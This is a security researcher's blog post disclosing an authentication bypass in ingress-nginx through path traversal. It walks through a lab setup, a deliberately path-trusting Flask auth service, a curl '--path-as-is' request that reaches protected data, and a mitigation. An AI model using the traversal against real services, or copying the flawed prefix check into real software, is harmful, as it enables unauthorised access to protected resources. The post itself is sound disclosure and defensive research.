<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>External Authentication bypass in ingress-nginx - xvnpw personal blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="In October 2021 I was researched ingress-nginx for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of $request_uri which leaded to Apache APISIX CVE-2021-43557. I have started with report on HackerOne to Kubernetes project: https://hackerone.com/reports/1357948. It took long time for the team to investigate it, but in the end I got some bounty üòè sadly report was closed as informative."><meta property="og:image" content><meta property="og:title" content="External Authentication bypass in ingress-nginx"><meta property="og:description" content="In October 2021 I was researched ingress-nginx for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of $request_uri which leaded to Apache APISIX CVE-2021-43557. I have started with report on HackerOne to Kubernetes project: https://hackerone.com/reports/1357948. It took long time for the team to investigate it, but in the end I got some bounty üòè sadly report was closed as informative."><meta property="og:type" content="article"><meta property="og:url" content="https://xvnpw.github.io/posts/external_authentication_bypass_in_ingress_nginx/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-29T16:59:02+01:00"><meta property="article:modified_time" content="2022-05-29T16:59:02+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="External Authentication bypass in ingress-nginx"><meta name=twitter:description content="In October 2021 I was researched ingress-nginx for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of $request_uri which leaded to Apache APISIX CVE-2021-43557. I have started with report on HackerOne to Kubernetes project: https://hackerone.com/reports/1357948. It took long time for the team to investigate it, but in the end I got some bounty üòè sadly report was closed as informative."><script src=https://xvnpw.github.io/js/feather.min.js></script>
<link href=https://xvnpw.github.io/css/fonts.b685ac6f654695232de7b82a9143a46f9e049c8e3af3a21d9737b01f4be211d1.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://xvnpw.github.io/css/main.40ca3a860425083862b7ebd55447caec5c4384573f0cb098b8d06a91e8dace2e.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://xvnpw.github.io/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=stylesheet type=text/css href=https://xvnpw.github.io/css/my.6c05193fd59255e7809f44153be743523b36838b781ff558a2ca5c9ce14a756e.css></head><body><div class=content><header><div class=main><a href=https://xvnpw.github.io/>xvnpw personal blog</a></div><nav><a href=/>Home</a>
<a href=/posts>All posts</a>
<a href=/about>About</a>
<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>External Authentication bypass in ingress-nginx</h1><div class=meta>Posted on May 29, 2022</div></div><section class=body><figure class=image-center><img src=https://user-images.githubusercontent.com/17719543/170878532-514c01cc-aa97-42b2-adba-f61a155d9863.png></figure><p>In October 2021 I was researched <a href=https://kubernetes.github.io/ingress-nginx/>ingress-nginx</a> for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of <code>$request_uri</code> which leaded to <a href=https://apisix.apache.org/blog/2021/11/23/cve-2021-43557-research-report/>Apache APISIX CVE-2021-43557</a>. I have started with report on HackerOne to Kubernetes project: <a href=https://hackerone.com/reports/1357948>https://hackerone.com/reports/1357948</a>. It took long time for the team to investigate it, but in the end I got some bounty üòè sadly report was closed as informative. They asked me to create normal <a href=https://github.com/kubernetes/ingress-nginx/issues/8644>issue</a> in github as this behavior is considered as <strong>not security issue</strong>. For me this is still an issue of <strong>insecure design</strong>.</p><p>Just look on values of <code>X-Original-Url</code> and <code>X-Auth-Request-Redirect</code> that are send to external auth service:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>X-Request-Id: 7d979c82ca55141ed0d58655fbaac586
</span></span><span style=display:flex><span>Host: auth-service.default.svc.cluster.local
</span></span><span style=display:flex><span>X-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected
</span></span><span style=display:flex><span>X-Original-Method: GET
</span></span><span style=display:flex><span>X-Sent-From: nginx-ingress-controller
</span></span><span style=display:flex><span>X-Real-Ip: 192.168.99.1
</span></span><span style=display:flex><span>X-Forwarded-For: 192.168.99.1
</span></span><span style=display:flex><span>X-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>User-Agent: curl/7.75.0
</span></span><span style=display:flex><span>Accept: */*
</span></span></code></pre></div><p>Root cause of the problem, is how nginx is handling <code>$request_uri</code> variable. It&rsquo;s documented very &ldquo;frugal&rdquo;:</p><figure class=image-center><img src=https://user-images.githubusercontent.com/17719543/170879498-1cca915f-9c5f-45f3-a6fc-fdfc97ff22a2.png></figure><p>For me it&rsquo;s not enough. There should be brought documentation of risks associated with consuming not normalized paths. After pointing it out to nginx team, I got response that it&rsquo;s obvious that <code>$request_uri</code> is not normalized and developers should take care of their projects üòï. This would be perfect world, but we are not living in such. Just compare it with documentation in <a href=https://www.envoyproxy.io>envoy</a>:</p><ul><li><a href=https://www.getambassador.io/docs/edge-stack/latest/topics/running/ambassador/#rejecting-client-requests-with-escaped-slashes>rejecting-client-requests-with-escaped-slashes</a> - although it&rsquo;s not directly for Emissary. It&rsquo;s describing well envoy concerts for escaped slashes</li><li><a href=https://github.com/envoyproxy/envoy/security/advisories/GHSA-xcx5-93pw-jw2w>GHSA-xcx5-93pw-jw2w</a> (CVE-2019‚Äì9901)‚Ää-‚Äädescription of risks associated with normalizing paths in envoy</li><li><a href=https://www.envoyproxy.io/docs/envoy/latest/api-v3/extensions/filters/network/http_connection_manager/v3/http_connection_manager.proto>envoy http connection manager options</a>‚Ää-‚Äälook for two particular: <code>normalize_path</code> and <code>path_with_escaped_slashes_action</code></li></ul><p><strong>If you also thinks similar. Put your comment in <a href=https://github.com/kubernetes/ingress-nginx/issues/8644>https://github.com/kubernetes/ingress-nginx/issues/8644</a></strong></p><h2 id=setting-thestage>Setting the¬†stage</h2><h3 id=install-ingress-nginx-into-kubernetes>install ingress-nginx into Kubernetes:</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>helm upgrade --install ingress-nginx ingress-nginx <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --repo https://kubernetes.github.io/ingress-nginx <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --namespace ingress-nginx --create-namespace
</span></span></code></pre></div><p>In case of problems follow <a href=https://kubernetes.github.io/ingress-nginx/deploy/>official guide</a>.</p><h3 id=deploy-test-application>deploy test application</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>kubectl apply -f https://raw.githubusercontent.com/xvnpw/k8s-ingress-auth-bypass/master/app.yaml
</span></span></code></pre></div><h3 id=optional-forward-ingress-port>[optional] forward ingress port</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>kubectl port-forward service/ingress-nginx-controller -n ingress-nginx 8080:80
</span></span></code></pre></div><h3 id=verify-services>verify services</h3><p>First public service. It should be available without authentication:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ curl http://127.0.0.1:8080/public-service/public -H &#34;Host: app.test&#34;
</span></span><span style=display:flex><span>{&#34;data&#34;:&#34;public data&#34;}
</span></span></code></pre></div><p>and now protected:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ curl http://127.0.0.1:8080/protected-service/protected  -H &#34;Host: app.test&#34;
</span></span><span style=display:flex><span>&lt;html&gt;
</span></span><span style=display:flex><span>&lt;head&gt;&lt;title&gt;401 Authorization Required&lt;/title&gt;&lt;/head&gt;
</span></span><span style=display:flex><span>&lt;body&gt;
</span></span><span style=display:flex><span>&lt;center&gt;&lt;h1&gt;401 Authorization Required&lt;/h1&gt;&lt;/center&gt;
</span></span><span style=display:flex><span>&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
</span></span><span style=display:flex><span>&lt;/body&gt;
</span></span><span style=display:flex><span>&lt;/html&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl http://127.0.0.1:8080/protected-service/protected -H &#34;X-Api-Key: secret-api-key&#34; -H &#34;Host: app.test&#34;
</span></span><span style=display:flex><span>{&#34;data&#34;:&#34;protected data&#34;}
</span></span></code></pre></div><p>as you can see I need to provide &ldquo;secret-api-key&rdquo; to get resource.</p><h2 id=exploitation>Exploitation</h2><p>Let&rsquo;s send request with path traversal</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ curl --path-as-is http://127.0.0.1:8080/public-service/../protected-service/protected -H &#34;Host: app.test&#34;
</span></span><span style=display:flex><span>{&#34;data&#34;:&#34;protected data&#34;}
</span></span></code></pre></div><p>As you can see, I was able to bypass uri restrictions üòÑ</p><h2 id=authentication-service>Authentication service</h2><p>Of course <strong>not all</strong> authentication services will be vulnerable. Only those that are making specific decisions based on requested paths. In my case service looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>@app.route(&#39;/verify&#39;)
</span></span><span style=display:flex><span>def verify():
</span></span><span style=display:flex><span>    print(request.headers, file=sys.stderr)
</span></span><span style=display:flex><span>    api_key = request.headers.get(&#39;X-Api-Key&#39;)
</span></span><span style=display:flex><span>    request_redirect = request.headers.get(&#39;X-Auth-Request-Redirect&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    if request_redirect and request_redirect.startswith(&#34;/public-service/&#34;):
</span></span><span style=display:flex><span>        return Response(status = HTTPStatus.NO_CONTENT)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    if api_key == &#34;secret-api-key&#34;:  
</span></span><span style=display:flex><span>        return Response(status = HTTPStatus.NO_CONTENT)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    return Response(status = HTTPStatus.UNAUTHORIZED)
</span></span></code></pre></div><p>and ingress is defined as:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>apiVersion: networking.k8s.io/v1
</span></span><span style=display:flex><span>kind: Ingress
</span></span><span style=display:flex><span>metadata:
</span></span><span style=display:flex><span>  name: my-ingress
</span></span><span style=display:flex><span>  annotations:
</span></span><span style=display:flex><span>    kubernetes.io/ingress.class: &#34;nginx&#34;
</span></span><span style=display:flex><span>    nginx.ingress.kubernetes.io/rewrite-target: /$1
</span></span><span style=display:flex><span>    nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify
</span></span><span style=display:flex><span>spec:
</span></span><span style=display:flex><span>  rules:
</span></span><span style=display:flex><span>    - host: app.test
</span></span><span style=display:flex><span>      http:
</span></span><span style=display:flex><span>        paths:
</span></span><span style=display:flex><span>          - path: /public-service/(.*)
</span></span><span style=display:flex><span>            pathType: Prefix
</span></span><span style=display:flex><span>            backend:
</span></span><span style=display:flex><span>              service:
</span></span><span style=display:flex><span>                name: public-service
</span></span><span style=display:flex><span>                port:
</span></span><span style=display:flex><span>                  number: 8080
</span></span><span style=display:flex><span>          - path: /protected-service/(.*)
</span></span><span style=display:flex><span>            pathType: Prefix
</span></span><span style=display:flex><span>            backend:
</span></span><span style=display:flex><span>              service:
</span></span><span style=display:flex><span>                name: protected-service
</span></span><span style=display:flex><span>                port:
</span></span><span style=display:flex><span>                  number: 8080
</span></span></code></pre></div><h3 id=mitigation>Mitigation</h3><p>One thing is to not trust content of <code>X-Original-Uri</code> and <code>X-Auth-Request-Redirect</code> headers. But there is also nice variable that can be used: <code>$service_name</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>apiVersion: networking.k8s.io/v1
</span></span><span style=display:flex><span>kind: Ingress
</span></span><span style=display:flex><span>metadata:
</span></span><span style=display:flex><span>  name: my-ingress
</span></span><span style=display:flex><span>  annotations:
</span></span><span style=display:flex><span>    nginx.ingress.kubernetes.io/rewrite-target: /$1
</span></span><span style=display:flex><span>    nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify
</span></span><span style=display:flex><span>    nginx.ingress.kubernetes.io/configuration-snippet: |
</span></span><span style=display:flex><span>      more_set_input_headers &#34;X-Forwarded-Scheme: $scheme&#34;;
</span></span><span style=display:flex><span>      more_set_input_headers &#34;X-Forwarded-Uri: $uri&#34;;
</span></span><span style=display:flex><span>      more_set_input_headers &#34;X-Forwarded-Prefix: $service_name&#34;;
</span></span><span style=display:flex><span>      more_set_input_headers &#34;X-Forwarded-Host: $http_host&#34;;
</span></span></code></pre></div><p>it allows to get name of service in kubernetes that is targeted by request and pass it to auth-url. This way it&rsquo;s not manipulated!</p><h2 id=summary>Summary</h2><p>I&rsquo;m really happy that I have asked myself what is <code>X-Auth-Request-Redirect</code> header üôÇ This question took me for nice adventure, where I have checked source code of several ingress controllers.</p><p>What is sad is how nginx is considering <code>$request_uri</code> and how hard is to convince both nginx and ingress-nginx team that this is real security problem.</p><p>Whole code of this example is here <a href=https://github.com/xvnpw/k8s-ingress-auth-bypass>https://github.com/xvnpw/k8s-ingress-auth-bypass</a>.</p><h3 id=other-articles-from-this-series>Other articles from this series</h3><ul><li><a href=https://xvnpw.github.io/posts/cve_2021_43557_apache_apisix_path_traversal_in_request_uri_variable/>CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable</a></li><li><a href=https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_traefik_and_haproxy/>Path traversal in authorization context in Traefik and HAProxy</a></li><li><a href=https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_emissary/>Path traversal in authorization context in Emissary</a></li><li><a href=https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_kong_and_f5_nginx/>Path traversal in authorization context in Kong and F5 NGINX</a></li><li><a href=https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/>Bug bounty tips for nginx $request_uri path traversal bypass</a></li><li><a href=https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/>Hunting for buggy authentication/authorization services on github</a></li></ul><hr><p>Thanks for reading! You can follow me on <a href=https://twitter.com/xvnpw>Twitter</a>.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/kubernetes>kubernetes</a></li><li><a href=/tags/ingress>ingress</a></li><li><a href=/tags/nginx>nginx</a></li><li><a href=/tags/path-traversal>path-traversal</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/xvnpw title=GitHub><i data-feather=github></i></a><a class=soc href=https://twitter.com/xvnpw title=Twitter><i data-feather=twitter></i></a></div><div class=footer-info>2022 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>